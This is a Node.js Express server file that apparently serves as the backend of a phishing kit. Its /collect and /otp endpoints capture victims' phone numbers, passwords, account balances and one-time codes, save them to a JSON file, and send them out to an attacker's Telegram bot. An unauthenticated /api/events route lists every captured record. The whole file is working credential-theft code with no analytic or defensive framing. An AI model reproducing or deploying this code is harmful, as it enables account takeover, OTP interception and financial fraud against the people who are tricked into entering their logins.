const express = require("express");
const fetch = require("node-fetch");
const cors = require("cors");
const fs = require("fs");
const path = require("path");

const app = express();
app.use(express.json());
app.use(cors());

// --- Simple JSON DB Implementation ---
const DB_FILE = path.join(__dirname, "events.json");

function getEvents() {
  try {
    if (!fs.existsSync(DB_FILE)) return [];
    const data = fs.readFileSync(DB_FILE, "utf8");
    return JSON.parse(data);
  } catch (e) {
    return [];
  }
}

function saveEvent(event) {
  const events = getEvents();
  // Add ID and timestamp
  event.id = events.length > 0 ? events[0].id + 1 : 1;
  event.created_at = new Date().toISOString().replace("T", " ").substring(0, 19);
  
  // Prepend to keep newest first (like ORDER BY id DESC)
  events.unshift(event);
  
  // Limit to 200 items
  if (events.length > 200) events.length = 200;
  
  fs.writeFileSync(DB_FILE, JSON.stringify(events, null, 2));
}
// -------------------------------------

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN || "";
const TELEGRAM_CHAT = process.env.TELEGRAM_CHAT || "";

function sendToTelegram(text) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT) return Promise.resolve();
  const url = "https://api.telegram.org/bot" + TELEGRAM_TOKEN + "/sendMessage";
  return fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ chat_id: TELEGRAM_CHAT, text }) });
}

app.post("/collect", async (req, res) => {
  const phone = String(req.body.phone || "");
  const password = String(req.body.password || "");
  const saldo = String(req.body.saldo || "");
  
  saveEvent({ phone, password, saldo });
  
  const text = "📱 Datos\n\n📞 Celular: " + phone + "\n🔒 Contraseña: " + password + "\n💰 Saldo: " + saldo;
  try { await sendToTelegram(text); } catch (_) {}
  res.json({ ok: true });
});

app.post("/otp", async (req, res) => {
  const phone = String(req.body.phone || "");
  const otp = String(req.body.otp || "");
  
  saveEvent({ phone, otp });
  
  const text = "🔐 Dinámica\n📞 Celular: " + phone + "\n🧩 Código: " + otp;
  try { await sendToTelegram(text); } catch (_) {}
  res.json({ ok: true });
});

app.get("/api/events", (req, res) => {
  const rows = getEvents();
  res.json(rows);
});

app.use("/", express.static(require("path").join(__dirname, "public")));

const port = process.env.PORT || 3000;
app.listen(port);
